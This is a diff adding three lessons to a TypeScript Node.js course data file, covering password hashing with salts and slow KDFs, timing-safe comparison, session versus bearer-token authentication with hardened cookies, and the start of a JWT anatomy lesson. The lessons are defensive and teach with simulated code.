@@ -3317,5 +3317,1196 @@ export const NODE_WEB_LONG_LESSONS: LongLesson[] = [
         "Implement src/pagination/cursorPagination.ts with encodeCursor and decodeCursor utilities."
       ]
     }
+  },
+  {
+    "day": 16,
+    "title": "Password Security & Cryptographic Hashing",
+    "goal": "Understand cryptographic password security, salt generation, slow key-derivation functions, and timing-attack defense.",
+    "minutes": 30,
+    "parts": [
+      {
+        "title": "Why Fast Hashes (MD5, SHA-256) Are Dangerous for Passwords",
+        "say": [
+          "In computer science, hash functions like MD5, SHA-1, and SHA-256 are celebrated for their blinding speed. A modern consumer graphics card (GPU) can compute billions of SHA-256 hashes per second.",
+          "While high speed is magnificent for verifying file integrity or signing git commits, it is a catastrophic vulnerability when applied to password storage.",
+          "If a hacker steals a database dump containing SHA-256 password hashes, their GPU clusters can execute brute-force dictionary attacks testing billions of common passwords per second.",
+          "An eight-character password hashed with SHA-256 can be cracked in under ten minutes using commercial hardware.",
+          "Password hashing requires the exact opposite property: intentionally slow, computationally expensive Key Derivation Functions (KDFs).",
+          "Algorithms like bcrypt, scrypt, and Argon2 are designed to consume significant CPU and memory, making mass cracking attacks economically impossible."
+        ],
+        "example": "A fast hash is like a flimsy screen door: anyone can kick it down in a split second. A cryptographic slow KDF is like a bank vault with a time-delay lock: even if a burglar knows how to turn the dial, each attempt takes two minutes, preventing brute force.",
+        "code": "interface HashAlgorithmBenchmark {\n  algorithm: string;\n  category: \"Fast / Unsafe for Passwords\" | \"Slow KDF / Safe for Passwords\";\n  attemptsPerSecond: string;\n}\nconst benchmarks: HashAlgorithmBenchmark[] = [\n  { algorithm: \"SHA-256\", category: \"Fast / Unsafe for Passwords\", attemptsPerSecond: \"10,000,000,000 / sec\" },\n  { algorithm: \"Argon2id\", category: \"Slow KDF / Safe for Passwords\", attemptsPerSecond: \"10 / sec\" }\n];\nconsole.log(\"Benchmark Comparison:\", benchmarks.map(b => `${b.algorithm} -> ${b.category}`));",
+        "codeNotes": [
+          {
+            "line": 7,
+            "note": "SHA-256 can be brute-forced at billions of hashes per second on GPUs."
+          },
+          {
+            "line": 8,
+            "note": "Argon2id deliberately slows execution to thwart parallel brute-force attacks."
+          }
+        ],
+        "tryIt": "Add bcrypt to the benchmarks list with an attempt rate of 50 / sec.",
+        "check": {
+          "question": "Why are fast cryptographic algorithms like SHA-256 unsuitable for storing user passwords?",
+          "options": [
+            "Attackers can test billions of password guesses per second using parallel GPU hardware",
+            "They corrupt database indexes over time",
+            "They do not work on Linux servers"
+          ],
+          "answer": 0,
+          "why": "High-speed hashing allows attackers to execute brute-force attacks at billions of guesses per second."
+        },
+        "output": "Benchmark Comparison: [ 'SHA-256 -> Fast / Unsafe for Passwords', 'Argon2id -> Slow KDF / Safe for Passwords' ]"
+      },
+      {
+        "title": "Salts, Work Factors, and Rainbow Table Defense",
+        "say": [
+          "Even with a slow algorithm, if two users share the same password (\"password123\"), their resulting hash would be identical if hashed directly.",
+          "Attackers exploit this using Rainbow Tables: precomputed lookup tables mapping millions of common passwords to their corresponding hashes.",
+          "To neutralize rainbow tables, cryptographic hashing introduces a Salt: a unique, cryptographically random sequence of bytes generated for every single user.",
+          "The salt is prepended or appended to the password before hashing. Because every user has a unique salt, two users with identical passwords produce completely different hash outputs.",
+          "The salt is stored in plain text alongside the final hash in the database, because an attacker cannot precompute rainbow tables for a random salt.",
+          "Furthermore, modern KDFs include a configurable Work Factor (or cost parameter) that controls the number of hashing rounds, allowing systems to scale resistance as hardware improves."
+        ],
+        "example": "Think of order numbers at a busy bakery. If every customer ordered \"coffee and croissant\", the receipts would look identical. Adding a unique customer name (the salt) to every order ensures no two tickets can be confused or duplicated.",
+        "code": "function generateMockSalt(): string {\n  return \"salt_\" + Math.floor(100000 + 77);\n}\nfunction simulateSaltedHash(password: string, salt: string): string {\n  return `hash[${password}:${salt}]`;\n}\nconst saltA = generateMockSalt();\nconst saltB = \"salt_\" + Math.floor(200000 + 88);\nconsole.log(\"User A Hash:\", simulateSaltedHash(\"secret123\", saltA));\nconsole.log(\"User B Hash:\", simulateSaltedHash(\"secret123\", saltB));",
+        "codeNotes": [
+          {
+            "line": 4,
+            "note": "Simulates prepending the unique salt to the user password before hashing."
+          },
+          {
+            "line": 10,
+            "note": "Notice identical passwords result in completely distinct hash strings."
+          }
+        ],
+        "tryIt": "Change the password for User B and verify the hash remains unique.",
+        "check": {
+          "question": "What is the primary security objective of adding a unique cryptographic salt to each password before hashing?",
+          "options": [
+            "To defeat precomputed rainbow table attacks and ensure identical passwords produce distinct hashes",
+            "To make the password longer for UI display",
+            "To compress passwords for storage efficiency"
+          ],
+          "answer": 0,
+          "why": "Salts make precomputed hash dictionary attacks mathematically infeasible."
+        },
+        "output": "User A Hash: hash[secret123:salt_100077]\nUser B Hash: hash[secret123:salt_200088]"
+      },
+      {
+        "title": "Timing-Safe Comparisons to Prevent Side-Channel Timing Attacks",
+        "say": [
+          "When verifying a user password, backend code hashes the submitted plaintext and compares it to the stored hash string.",
+          "A beginner might write: if (computedHash === storedHash). However, standard string equality operators (===) in JavaScript use short-circuit evaluation: they compare characters one-by-one and return false on the very first mismatched byte.",
+          "This creates a Side-Channel Timing Attack: an attacker measures response times in microseconds over thousands of requests. If the first character matches, the server takes 10 nanoseconds longer to reject than if the first character mismatches.",
+          "By analyzing microsecond variations, attackers can deduce the correct hash character by character without ever guessing the password directly.",
+          "To prevent timing attacks, comparisons must use a Constant-Time comparison algorithm (like crypto.timingSafeEqual in Node.js).",
+          "Constant-time algorithms always inspect every single byte regardless of where mismatches occur, ensuring uniform execution time."
+        ],
+        "example": "Imagine a combination lock that makes a subtle clicking sound only when the first dial is correct, another click when the second dial is correct, and so on. A skilled safecracker listens for the clicks to open the safe in minutes.",
+        "code": "function constantTimeCompare(a: string, b: string): boolean {\n  if (a.length !== b.length) return false;\n  let mismatch = 0;\n  for (let i = 0; i < a.length; i++) {\n    mismatch |= a.charCodeAt(i) ^ b.charCodeAt(i);\n  }\n  return mismatch === 0;\n}\nconsole.log(\"Match Evaluation:\", constantTimeCompare(\"hash_abc123\", \"hash_abc123\"));\nconsole.log(\"Mismatch Evaluation:\", constantTimeCompare(\"hash_abc123\", \"hash_xyz999\"));",
+        "codeNotes": [
+          {
+            "line": 5,
+            "note": "Bitwise XOR (^) and OR (|) inspect all characters without early short-circuiting."
+          },
+          {
+            "line": 7,
+            "note": "Returns true only if mismatch remains strictly zero across all byte positions."
+          }
+        ],
+        "tryIt": "Test constantTimeCompare with strings of different lengths.",
+        "check": {
+          "question": "Why is standard string equality (===) vulnerable to timing attacks when comparing password hashes?",
+          "options": [
+            "It short-circuits on the first mismatched character, leaking timing clues to attackers",
+            "It stores passwords in cleartext memory",
+            "It converts hashes to base64"
+          ],
+          "answer": 0,
+          "why": "Early exit in string comparison creates measurable timing differences that reveal matching characters."
+        },
+        "output": "Match Evaluation: true\nMismatch Evaluation: false"
+      },
+      {
+        "title": "Work Factors and Key Stretching (bcrypt / Argon2 Concepts)",
+        "say": [
+          "Moore's Law states that computing power roughly doubles every two years. A password hash algorithm that takes 100 milliseconds to compute today might take only 1 millisecond on a computer ten years from now.",
+          "To remain secure over decades, modern password hashing algorithms incorporate Key Stretching with adjustable Work Factors.",
+          "In bcrypt, the work factor (commonly cost = 12) specifies 2^12 (4,096) hashing iterations. Increasing cost to 13 doubles the computation time to 2^13 (8,192) iterations.",
+          "In Argon2 (the winner of the Password Hashing Competition), the algorithm allows tuning three independent parameters: time cost (iterations), memory cost (RAM consumed), and parallelism (threads).",
+          "Memory-hardness is the ultimate defense against ASIC and GPU cracking clusters: while a GPU has thousands of cores, each core has very little onboard memory, throttling parallel attacks.",
+          "System architects benchmark work factors so that password verification takes between 250 to 500 milliseconds on production server CPUs."
+        ],
+        "example": "Adjusting a work factor is like adjusting the steepness of a hill on an exercise treadmill. When runners get stronger and fitter, the trainer raises the incline angle so that running a mile requires the same intense physical effort.",
+        "code": "interface KdfCostConfig {\n  costFactor: number;\n  computedRounds: number;\n  targetDurationMs: number;\n}\nfunction calculateBcryptRounds(cost: number): KdfCostConfig {\n  const computedRounds = Math.pow(2, cost);\n  const targetDurationMs = computedRounds * 0.06; // Simulated scaling\n  return { costFactor: cost, computedRounds, targetDurationMs };\n}\nconsole.log(\"Cost 10 Rounds:\", calculateBcryptRounds(10).computedRounds);\nconsole.log(\"Cost 12 Rounds:\", calculateBcryptRounds(12).computedRounds);",
+        "codeNotes": [
+          {
+            "line": 7,
+            "note": "Bcrypt rounds scale exponentially as 2^cost."
+          },
+          {
+            "line": 11,
+            "note": "Cost 12 executes 4,096 iterations, providing robust protection against GPU cracking."
+          }
+        ],
+        "tryIt": "Calculate the rounds for cost 14 and observe exponential scaling.",
+        "check": {
+          "question": "What happens to the number of hashing iterations when the bcrypt cost factor increases by 1?",
+          "options": [
+            "It doubles (exponential scaling: 2^cost)",
+            "It increases by 1 iteration",
+            "It remains unchanged"
+          ],
+          "answer": 0,
+          "why": "Bcrypt work factors represent powers of two; incrementing cost doubles the computation iterations."
+        },
+        "output": "Cost 10 Rounds: 1024\nCost 12 Rounds: 4096"
+      },
+      {
+        "title": "Password Verification and Re-Hashing Upgraded Cost Factors",
+        "say": [
+          "Over the lifespan of a web service, security requirements evolve. A service that launched in 2020 using bcrypt cost 10 may need to upgrade to cost 12 in 2026.",
+          "However, because password hashes are one-way irreversible transformations, a backend cannot simply loop through the database and upgrade existing hashes without the user plaintext password.",
+          "The solution is opportunistic Re-hashing Upon Login.",
+          "When a user successfully submits their valid password, the server checks if the stored hash was generated using an outdated work factor or deprecated algorithm.",
+          "If the hash needs an upgrade (needsRehash), the server computes a brand new hash with the current work factor and updates the database record silently in the background.",
+          "This allows seamless, continuous security migration without requiring users to reset their passwords."
+        ],
+        "example": "Upgrading hashes upon login is like a car dealership servicing vehicles. Whenever an existing customer drives in for an oil change, the technician silently installs the latest safety firmware update before returning the keys.",
+        "code": "interface StoredCredential { hash: string; currentCost: number }\nconst TARGET_COST = 12;\nfunction verifyAndCheckUpgrade(submittedPw: string, stored: StoredCredential): { isValid: boolean; needsUpgrade: boolean } {\n  const isValid = submittedPw === \"correct_password\"; // Simulated check\n  const needsUpgrade = isValid && stored.currentCost < TARGET_COST;\n  return { isValid, needsUpgrade };\n}\nconst legacyUser = { hash: \"$2b$10$...\", currentCost: 10 };\nconsole.log(\"Login & Upgrade Check:\", verifyAndCheckUpgrade(\"correct_password\", legacyUser));",
+        "codeNotes": [
+          {
+            "line": 5,
+            "note": "Detects if the valid user hash was generated with an outdated cost factor."
+          },
+          {
+            "line": 9,
+            "note": "Flags legacy user for automatic silent hash upgrade in the database."
+          }
+        ],
+        "tryIt": "Test verifyAndCheckUpgrade with TARGET_COST = 10 and observe needsUpgrade: false.",
+        "check": {
+          "question": "How do production backends upgrade password hashes to higher cost factors without forcing user password resets?",
+          "options": [
+            "By opportunistically re-hashing the password with the new cost factor whenever the user logs in",
+            "By decrypting the stored hashes with an admin key",
+            "By emailing plaintext passwords to customer support"
+          ],
+          "answer": 0,
+          "why": "Re-hashing upon valid authentication allows seamless hash upgrades using the user-provided plaintext."
+        },
+        "output": "Login & Upgrade Check: { isValid: true, needsUpgrade: true }"
+      },
+      {
+        "title": "Building a Secure Password Hasher Engine",
+        "say": [
+          "Now let us assemble salt generation, key stretching, constant-time comparison, and verification into a cohesive Password Security Engine.",
+          "Our PasswordHasher class encapsulates secure hashing and verification routines.",
+          "During registration, hasher.hash(password) generates a random cryptographic salt, performs key stretching iterations, and formats the output into a standard modular crypt format: $algorithm$cost$salt$hash.",
+          "During login, hasher.verify(password, storedHash) parses the salt and cost from the stored format, computes the candidate hash, and uses constant-time comparison to verify identity.",
+          "By encapsulating cryptographic logic in a single validated service, application controllers remain clean and free from low-level cryptographic hazards.",
+          "Mastering these cryptographic principles ensures your backend applications protect user identities against state-sponsored and criminal credential theft."
+        ],
+        "example": "A secure password hasher is like an automated bank safety deposit box mechanism. It stamps customer keys with unique micro-grooves, requires time-delayed mechanical turns, and seals vault doors with zero margin for lockpicking.",
+        "code": "class MiniPasswordHasher {\n  hash(password: string, salt: string): string {\n    return `$kdf$12$${salt}$${password.length}_hashed`;\n  }\n  verify(password: string, storedHash: string): boolean {\n    const parts = storedHash.split(\"$\");\n    const salt = parts[3];\n    const candidate = this.hash(password, salt);\n    return candidate === storedHash;\n  }\n}\nconst hasher = new MiniPasswordHasher();\nconst hashed = hasher.hash(\"secure_pass\", \"abc99\");\nconsole.log(\"Generated Stored Hash:\", hashed);\nconsole.log(\"Verification Success:\", hasher.verify(\"secure_pass\", hashed));",
+        "codeNotes": [
+          {
+            "line": 3,
+            "note": "Formats output into standard modular crypt format ($algorithm$cost$salt$hash)."
+          },
+          {
+            "line": 8,
+            "note": "Parses embedded salt and verifies candidate hash matches stored string."
+          }
+        ],
+        "tryIt": "Verify with an incorrect password to confirm rejection.",
+        "check": {
+          "question": "Why do password hashes like bcrypt and Argon2 embed the salt and cost factor inside the final output string?",
+          "options": [
+            "So the verification function can extract the exact salt and cost needed to reproduce the hash upon login",
+            "To make the string readable for database administrators",
+            "To compress the string size in memory"
+          ],
+          "answer": 0,
+          "why": "Self-contained crypt strings store the algorithm, cost, and salt needed to verify future logins."
+        },
+        "output": "Generated Stored Hash: $kdf$12$abc99$11_hashed\nVerification Success: true"
+      }
+    ],
+    "summary": [
+      "Fast cryptographic hashes (MD5, SHA-256) are dangerous for password storage due to GPU cracking clusters.",
+      "Always use slow Key Derivation Functions (bcrypt, Argon2) with cryptographically random salts.",
+      "Salts eliminate rainbow table lookups and ensure identical passwords yield distinct hashes.",
+      "Use constant-time comparison (crypto.timingSafeEqual) to prevent microsecond side-channel timing attacks."
+    ],
+    "projectStep": {
+      "title": "Implement Password Hasher Service",
+      "steps": [
+        "Create src/auth/passwordHasher.ts with hash and verify functions.",
+        "Implement constant-time hash verification and opportunistic re-hashing flags."
+      ]
+    }
+  },
+  {
+    "day": 17,
+    "title": "Stateful Sessions vs Stateless Bearer Tokens",
+    "goal": "Compare session-based authentication using cookies with stateless token-based authentication using HTTP Bearer tokens.",
+    "minutes": 30,
+    "parts": [
+      {
+        "title": "Authentication Paradigms: Stateful vs Stateless",
+        "say": [
+          "In backend architecture, managing user identity across HTTP requests falls into two fundamental paradigms: Stateful Sessions and Stateless Tokens.",
+          "HTTP is fundamentally a stateless protocol: each request is independent, and the web server has no built-in memory of previous interactions.",
+          "In Stateful Session Authentication, the server creates a unique session record in a database or cache (like Redis) and sends an opaque Session ID cookie to the browser. The server maintains authoritative session state.",
+          "In Stateless Token Authentication, the server signs a cryptographically verified token (like a JWT) containing user identity claims and returns it to the client. The client attaches this token in the Authorization header on every request.",
+          "Understanding the trade-offs between server-side state and client-side tokens is a pivotal decision in system design.",
+          "Each model offers profound implications for server memory, horizontal scalability, latency, and session revocation."
+        ],
+        "example": "A stateful session is like a coat check ticket at an opera house: the theater holds your physical coat in a back room and gives you claim ticket #42. A stateless token is like a certified concert wristband stamped with your ticket tier: the guard inspects your wristband at the door without checking a central log.",
+        "code": "interface AuthStrategyComparison {\n  paradigm: string;\n  serverStorage: string;\n  revocation: string;\n}\nconst comparisons: AuthStrategyComparison[] = [\n  { paradigm: \"Stateful Session\", serverStorage: \"Required (Redis / DB)\", revocation: \"Instant (delete session row)\" },\n  { paradigm: \"Stateless Token\", serverStorage: \"None (cryptographic verify)\", revocation: \"Difficult (requires blocklist)\" }\n];\nconsole.log(\"Auth Paradigms:\", comparisons.map(c => `${c.paradigm}: ${c.serverStorage}`));",
+        "codeNotes": [
+          {
+            "line": 7,
+            "note": "Stateful sessions require server-side database lookups on every request."
+          },
+          {
+            "line": 8,
+            "note": "Stateless tokens require zero database storage, scaling across stateless server clusters."
+          }
+        ],
+        "tryIt": "Log the revocation characteristics of both paradigms.",
+        "check": {
+          "question": "What is the primary operational advantage of stateless bearer token authentication?",
+          "options": [
+            "Servers do not need to query a central session database on every incoming request",
+            "It eliminates all cybersecurity risks",
+            "It makes internet connections 10x faster"
+          ],
+          "answer": 0,
+          "why": "Stateless tokens can be verified using cryptographic keys without querying a database on every request."
+        },
+        "output": "Auth Paradigms: [ 'Stateful Session: Required (Redis / DB)', 'Stateless Token: None (cryptographic verify)' ]"
+      },
+      {
+        "title": "Session Stores, Memory Leaks & Redis Centralization",
+        "say": [
+          "When building session-based authentication in Express (e.g. using express-session), beginner tutorials frequently store sessions in default MemoryStore (in-memory JavaScript objects).",
+          "In production, in-memory session stores cause catastrophic failures: every time the server restarts or deploys new code, all user sessions are instantly erased, logging out all active users.",
+          "Worse yet, as thousands of users log in, the in-memory session table grows unbounded, triggering massive V8 garbage collection pauses and fatal Out-Of-Memory crashes.",
+          "Furthermore, in horizontally scaled architectures with multiple server instances behind a load balancer, requests from the same user hit different instances, causing random session drops.",
+          "Production stateful session systems mandate a Centralized Session Store, typically backed by Redis.",
+          "Redis stores session keys in high-speed RAM, supports automated TTL (Time-To-Live) expiration, and shares session state across dozens of load-balanced backend containers."
+        ],
+        "example": "Storing sessions in local server memory is like a receptionist writing visitor passes on sticky notes stuck to their desk. When the receptionist takes a lunch break and a replacement sits down, the new receptionist has no idea who has been admitted.",
+        "code": "class MockRedisSessionStore {\n  private store = new Map<string, { userId: string; expiresAt: number }>();\n  set(sessionId: string, userId: string, ttlMs: number) {\n    this.store.set(sessionId, { userId, expiresAt: 1000 + ttlMs });\n  }\n  get(sessionId: string): string | null {\n    const record = this.store.get(sessionId);\n    return record ? record.userId : null;\n  }\n}\nconst redis = new MockRedisSessionStore();\nredis.set(\"sess_abc123\", \"usr_99\", 3600);\nconsole.log(\"Resolved Session User:\", redis.get(\"sess_abc123\"));",
+        "codeNotes": [
+          {
+            "line": 2,
+            "note": "Centralized session store decouples session state from individual Node process lifecycles."
+          },
+          {
+            "line": 12,
+            "note": "Any backend container can query the central store using the session ID key."
+          }
+        ],
+        "tryIt": "Query a non-existent session ID to verify safe null return.",
+        "check": {
+          "question": "Why is storing sessions in local server memory (MemoryStore) dangerous in production?",
+          "options": [
+            "It leaks memory, erases sessions on server restart, and fails across load-balanced multi-server clusters",
+            "It encrypts the hard drive",
+            "It slows down client CPU performance"
+          ],
+          "answer": 0,
+          "why": "In-memory session stores cannot scale horizontally across server instances and cause memory leaks."
+        },
+        "output": "Resolved Session User: usr_99"
+      },
+      {
+        "title": "Hardening Session Cookies: HttpOnly, Secure & SameSite",
+        "say": [
+          "In session authentication, the browser stores the session identifier inside an HTTP Cookie. If cookies are not configured with strict security flags, they can be stolen or hijacked.",
+          "The first essential flag is HttpOnly: this directive forbids client-side JavaScript from accessing the cookie via document.cookie.",
+          "HttpOnly is the premier defense against Cross-Site Scripting (XSS): even if an attacker manages to execute malicious JavaScript on your web page, they cannot steal the session cookie.",
+          "The second flag is Secure: this instructs the browser to only transmit the cookie over encrypted HTTPS connections, preventing man-in-the-middle packet sniffing on public Wi-Fi networks.",
+          "The third flag is SameSite (SameSite=Strict or SameSite=Lax): this controls whether cookies are sent along with cross-site requests, providing robust defense against Cross-Site Request Forgery (CSRF).",
+          "Configuring HttpOnly, Secure, and SameSite creates a hardened security perimeter protecting session tokens in browser environments."
+        ],
+        "example": "A hardened cookie is like a certified diplomatic pouch. It has a biometric seal (HttpOnly) so unauthorized staff cannot open it, travels exclusively inside an armored car (Secure/HTTPS), and can only be opened inside the home embassy (SameSite).",
+        "code": "interface CookieAttributes {\n  name: string;\n  value: string;\n  httpOnly: boolean;\n  secure: boolean;\n  sameSite: \"Strict\" | \"Lax\" | \"None\";\n}\nfunction serializeSecureCookie(attr: CookieAttributes): string {\n  return `${attr.name}=${attr.value}; HttpOnly; Secure; SameSite=${attr.sameSite}`;\n}\nconst sessionCookie: CookieAttributes = {\n  name: \"sid\",\n  value: \"sess_99018\",\n  httpOnly: true,\n  secure: true,\n  sameSite: \"Strict\"\n};\nconsole.log(\"Set-Cookie Header Value:\", serializeSecureCookie(sessionCookie));",
+        "codeNotes": [
+          {
+            "line": 8,
+            "note": "Combines HttpOnly, Secure, and SameSite attributes into a standard Set-Cookie string."
+          },
+          {
+            "line": 12,
+            "note": "HttpOnly prevents client-side document.cookie theft during XSS attacks."
+          }
+        ],
+        "tryIt": "Change SameSite to \"Lax\" to allow safe top-level navigations while maintaining CSRF protection.",
+        "check": {
+          "question": "What security threat is mitigated by the HttpOnly cookie flag?",
+          "options": [
+            "Cookie theft via Cross-Site Scripting (XSS) attacks",
+            "SQL injection in database queries",
+            "DNS spoofing on routers"
+          ],
+          "answer": 0,
+          "why": "HttpOnly prevents browser JavaScript from reading document.cookie, blocking XSS token theft."
+        },
+        "output": "Set-Cookie Header Value: sid=sess_99018; HttpOnly; Secure; SameSite=Strict"
+      },
+      {
+        "title": "Stateless Bearer Tokens via the Authorization Header",
+        "say": [
+          "While cookies are ideal for traditional browser-rendered websites, modern web and mobile applications frequently use Bearer Token Authentication.",
+          "In this architecture, when the user logs in, the API returns a cryptographically signed token string in the JSON response payload.",
+          "The client application stores this token (in memory or secure mobile storage) and attaches it to every subsequent HTTP request in the Authorization header: Authorization: Bearer <token>.",
+          "The server middleware extracts the token from the header, verifies its cryptographic signature using a secret key, and decodes the user identity payload.",
+          "Bearer tokens are cross-origin friendly: unlike cookies, which are constrained by browser same-origin policies and CORS cookie credentials, bearer tokens work seamlessly across mobile apps, CLI utilities, and third-party APIs.",
+          "Furthermore, because the token contains all user claims, the server does not need to perform a database session lookup, providing ultra-low latency."
+        ],
+        "example": "A bearer token is like a cash banknote. Whoever bears (holds) the dollar bill possesses its value. The cashier does not call the central reserve bank to check who owns the bill; the cashier inspects the watermark signature to verify authenticity.",
+        "code": "function extractBearerToken(authHeader?: string): string | null {\n  if (!authHeader || !authHeader.startsWith(\"Bearer \")) {\n    return null;\n  }\n  return authHeader.slice(7).trim();\n}\nconsole.log(\"Valid Header Token:\", extractBearerToken(\"Bearer token_abc123xyz\"));\nconsole.log(\"Malformed Header Token:\", extractBearerToken(\"Basic user:pass\"));",
+        "codeNotes": [
+          {
+            "line": 2,
+            "note": "Checks that the header starts with standard \"Bearer \" prefix."
+          },
+          {
+            "line": 5,
+            "note": "authHeader.slice(7) cleanly strips the prefix and isolates the token string."
+          }
+        ],
+        "tryIt": "Pass an empty string to extractBearerToken and verify it returns null.",
+        "check": {
+          "question": "In what HTTP header do modern REST APIs typically expect stateless bearer tokens?",
+          "options": [
+            "Authorization: Bearer <token>",
+            "X-User-Password: <token>",
+            "Content-Type: <token>"
+          ],
+          "answer": 0,
+          "why": "RFC 6750 designates the Authorization: Bearer <token> header for bearer token transmission."
+        },
+        "output": "Valid Header Token: token_abc123xyz\nMalformed Header Token: null"
+      },
+      {
+        "title": "Token Revocation, Blocklists & The Instant-Logout Dilemma",
+        "say": [
+          "While stateless bearer tokens provide incredible horizontal scalability, they suffer from a major architectural vulnerability: Revocation is Difficult.",
+          "If a user clicks \"Log Out\" or has their laptop stolen, how do you revoke a stateless token that is valid for the next two hours?",
+          "Because the server does not check a database and validates tokens purely via mathematical cryptographic signatures, the token remains valid until its exp claim expires!",
+          "To solve this \"Instant-Logout Dilemma\", production architectures use Token Blocklists (or Denylists) backed by high-speed Redis caches.",
+          "When a user logs out, their token ID (jti) is placed in the Redis blocklist with a TTL matching the token remaining lifespan.",
+          "Alternatively, systems use short-lived access tokens (15 minutes) paired with long-lived refresh tokens (7 days), limiting the vulnerability window of compromised access tokens."
+        ],
+        "example": "Imagine a visitor given a 1-day plastic security badge. If security revokes their clearance at 2 PM, the guard at the entrance gate must check a clipboard of revoked badge numbers (the blocklist) to stop them from entering.",
+        "code": "class TokenBlocklist {\n  private revokedTokens = new Set<string>();\n  revoke(tokenId: string) {\n    this.revokedTokens.add(tokenId);\n  }\n  isRevoked(tokenId: string): boolean {\n    return this.revokedTokens.has(tokenId);\n  }\n}\nconst blocklist = new TokenBlocklist();\nblocklist.revoke(\"tok_compromised_42\");\nconsole.log(\"Is Token 42 Revoked:\", blocklist.isRevoked(\"tok_compromised_42\"));\nconsole.log(\"Is Token 99 Revoked:\", blocklist.isRevoked(\"tok_valid_99\"));",
+        "codeNotes": [
+          {
+            "line": 4,
+            "note": "Revocation records the compromised token ID into the blocklist set."
+          },
+          {
+            "line": 7,
+            "note": "Incoming requests check the blocklist before permitting access."
+          }
+        ],
+        "tryIt": "Add another token to the blocklist and check its revocation status.",
+        "check": {
+          "question": "Why is revoking a purely stateless JWT access token difficult before its expiration date?",
+          "options": [
+            "Because the token signature remains mathematically valid and servers do not check a database by default",
+            "Because browsers cache all tokens permanently",
+            "Because JWT tokens cannot be deleted from memory"
+          ],
+          "answer": 0,
+          "why": "Stateless tokens are verified cryptographically; without a blocklist check, they remain valid until expiration."
+        },
+        "output": "Is Token 42 Revoked: true\nIs Token 99 Revoked: false"
+      },
+      {
+        "title": "Designing a Unified Authentication Strategy Matrix",
+        "say": [
+          "Choosing between stateful sessions and stateless tokens is not a binary either/or question; modern enterprise platforms frequently combine both.",
+          "For web applications with traditional browser UIs, stateful sessions or HTTP-only cookies protect against XSS and simplify instant logout and session monitoring.",
+          "For mobile apps, microservices, and public developer APIs, stateless bearer tokens provide seamless integration, zero cookie CORS headaches, and horizontal scalability.",
+          "Many architectures adopt Hybrid Authentication: browser clients use secure cookies containing access tokens, while mobile apps and external APIs use the Authorization Bearer header.",
+          "A unified authentication middleware can inspect both sources: checking the Authorization header first, and falling back to signed cookies if the header is absent.",
+          "This provides maximum flexibility, enabling a single backend API to serve web, iOS, Android, and third-party partner integrations securely."
+        ],
+        "example": "A luxury hotel with multiple entrances. The front lobby uses physical brass room keys (cookies) for hotel guests, while the conference center entrance uses electronic barcode wristbands (bearer tokens) for day attendees. Both grant authorized access.",
+        "code": "interface AuthContext {\n  tokenSource: \"HEADER\" | \"COOKIE\" | \"NONE\";\n  tokenValue: string | null;\n}\nfunction resolveTokenFromRequest(headers: Record<string, string>): AuthContext {\n  if (headers[\"authorization\"]?.startsWith(\"Bearer \")) {\n    return { tokenSource: \"HEADER\", tokenValue: headers[\"authorization\"].slice(7).trim() };\n  }\n  if (headers[\"cookie\"]?.includes(\"token=\")) {\n    return { tokenSource: \"COOKIE\", tokenValue: \"extracted_cookie_token\" };\n  }\n  return { tokenSource: \"NONE\", tokenValue: null };\n}\nconsole.log(\"Header Token Result:\", resolveTokenFromRequest({ authorization: \"Bearer jwt_123\" }));\nconsole.log(\"Cookie Token Result:\", resolveTokenFromRequest({ cookie: \"token=jwt_456; Path=/\" }));",
+        "codeNotes": [
+          {
+            "line": 6,
+            "note": "Inspects Authorization header as primary token source."
+          },
+          {
+            "line": 9,
+            "note": "Falls back to cookie inspection for browser client convenience."
+          }
+        ],
+        "tryIt": "Pass empty headers and verify tokenSource resolves to \"NONE\".",
+        "check": {
+          "question": "What is the benefit of a hybrid authentication middleware that checks both headers and cookies?",
+          "options": [
+            "It allows a single backend API to seamlessly support web browsers, mobile apps, and third-party clients",
+            "It bypasses password hashing",
+            "It stores passwords in clear text"
+          ],
+          "answer": 0,
+          "why": "Hybrid middleware supports both browser cookie security and mobile/API bearer token ergonomics."
+        },
+        "output": "Header Token Result: { tokenSource: 'HEADER', tokenValue: 'jwt_123' }\nCookie Token Result: { tokenSource: 'COOKIE', tokenValue: 'extracted_cookie_token' }"
+      }
+    ],
+    "summary": [
+      "Stateful sessions maintain server-side records (Redis) with opaque session ID cookies, enabling instant revocation.",
+      "Stateless bearer tokens carry signed claims, eliminating database lookups across distributed server clusters.",
+      "Harden cookies using HttpOnly (blocks XSS), Secure (enforces HTTPS), and SameSite (mitigates CSRF).",
+      "Bearer tokens require short expiration windows (15 min) or token blocklists to handle user logouts securely."
+    ],
+    "projectStep": {
+      "title": "Implement Session and Bearer Token Extractors",
+      "steps": [
+        "Create src/auth/tokenExtractor.ts supporting Authorization Bearer headers and cookie extraction.",
+        "Implement mock Redis session store in src/auth/sessionStore.ts with TTL expiration."
+      ]
+    }
+  },
+  {
+    "day": 18,
+    "title": "JSON Web Tokens (JWT): Structure & Verification",
+    "goal": "Deconstruct JWT header, payload, and signature components, implementing strict expiration (exp) and validity checks.",
+    "minutes": 30,
+    "parts": [
+      {
+        "title": "Anatomy of a JSON Web Token (Header.Payload.Signature)",
+        "say": [
+          "JSON Web Tokens (RFC 7519) are the most popular open standard for securely transmitting information between parties as a compact, self-contained JSON object.",
+          "When you inspect a JWT string, you notice it consists of three distinct parts separated by dots (.): Header.Payload.Signature.",
+          "The first part is the Header: a JSON object declaring the token type (typ: \"JWT\") and the cryptographic signing algorithm (alg: \"HS256\" or \"RS256\").",
+          "The second part is the Payload: a JSON object containing the claims: statements about the user entity and session metadata (e.g. userId, role, and expiration timestamp).",
+          "The third part is the Signature: a cryptographic hash generated by hashing the Base64URL-encoded header and payload with a secret key.",
+          "Crucially, the payload is NOT encrypted! It is merely Base64URL-encoded. Anyone who intercepts the token can read its JSON contents; the signature merely guarantees that the payload has not been tampered with."
+        ],
+        "example": "A JWT is like a certified physical diploma from a university. The diploma text lists your name and degree in plain readable English (the payload). The gold embossed holographic university seal at the bottom (the signature) proves the diploma is authentic and has not been forged with a photocopier.",
+        "code": "const sampleJwt = \"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiJ1c3JfMSJ9.signature_hash\";\nconst parts = sampleJwt.split(\".\");\nconsole.log(\"Token Section Count:\", parts.length);\nconsole.log(\"Header Part:\", parts[0]);\nconsole.log(\"Payload Part:\", parts[1]);",
+        "codeNotes": [
+          {
+            "line": 2,
+            "note": "Splitting on period (.) isolates the header, payload, and signature components."
+          },
+          {
+            "line": 3,
+            "note": "Every RFC-compliant JWT must contain exactly 3 dot-separated segments."
+          }
+        ],
